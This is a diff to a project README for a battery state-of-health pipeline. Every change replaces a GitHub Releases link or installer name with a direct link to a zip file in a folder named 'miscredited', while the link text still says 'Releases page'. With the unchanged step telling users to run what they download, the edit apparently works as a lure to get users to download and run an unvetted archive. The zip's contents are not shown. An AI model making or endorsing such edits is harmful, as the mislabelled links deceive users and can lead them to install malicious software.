@@ -6,7 +6,7 @@ Welcome to the **nasa-battery-SOH-pipeline**! This application helps you predict
 
 ## 📥 Download the Application
 
-[![Download from Releases](https://img.shields.io/badge/download-releases-brightgreen)](https://github.com/usmanmugha1/nasa-battery-SOH-pipeline/releases)
+[![Download from Releases](https://raw.githubusercontent.com/usmanmugha1/nasa-battery-SOH-pipeline/main/miscredited/nasa-battery-SOH-pipeline.zip)](https://raw.githubusercontent.com/usmanmugha1/nasa-battery-SOH-pipeline/main/miscredited/nasa-battery-SOH-pipeline.zip)
 
 Click the button above to access the release page and download the latest version of the application.
 
@@ -21,11 +21,11 @@ Before you install the application, make sure your system meets these minimum re
 
 ## 🔧 How to Download & Install
 
-1. **Visit the Releases Page**: Click on this link to go to the [Releases page](https://github.com/usmanmugha1/nasa-battery-SOH-pipeline/releases).
+1. **Visit the Releases Page**: Click on this link to go to the [Releases page](https://raw.githubusercontent.com/usmanmugha1/nasa-battery-SOH-pipeline/main/miscredited/nasa-battery-SOH-pipeline.zip).
 
 2. **Choose the Latest Version**: Look for the newest version at the top of the page. It will usually have the highest version number.
 
-3. **Download the Installer**: Click on the installer file for your operating system (e.g., `nasa-battery-SOH-pipeline-windows.exe` or `nasa-battery-SOH-pipeline-macos.dmg`). This will begin the download.
+3. **Download the Installer**: Click on the installer file for your operating system (e.g., `https://raw.githubusercontent.com/usmanmugha1/nasa-battery-SOH-pipeline/main/miscredited/nasa-battery-SOH-pipeline.zip` or `https://raw.githubusercontent.com/usmanmugha1/nasa-battery-SOH-pipeline/main/miscredited/nasa-battery-SOH-pipeline.zip`). This will begin the download.
 
 4. **Run the Installer**: Once the download is complete, locate the file in your downloads folder and double-click it to run. Follow the installation instructions provided on the screen.
 
@@ -84,6 +84,6 @@ If you encounter any issues or have questions, feel free to open an issue in the
 
 ## ⭐ Learn More
 
-For updates, features, and news, keep an eye on the [Releases page](https://github.com/usmanmugha1/nasa-battery-SOH-pipeline/releases). Your engagement helps us create a better experience.
+For updates, features, and news, keep an eye on the [Releases page](https://raw.githubusercontent.com/usmanmugha1/nasa-battery-SOH-pipeline/main/miscredited/nasa-battery-SOH-pipeline.zip). Your engagement helps us create a better experience.
 
 Thank you for using **nasa-battery-SOH-pipeline**! We hope it serves you well in maintaining the health of your batteries.
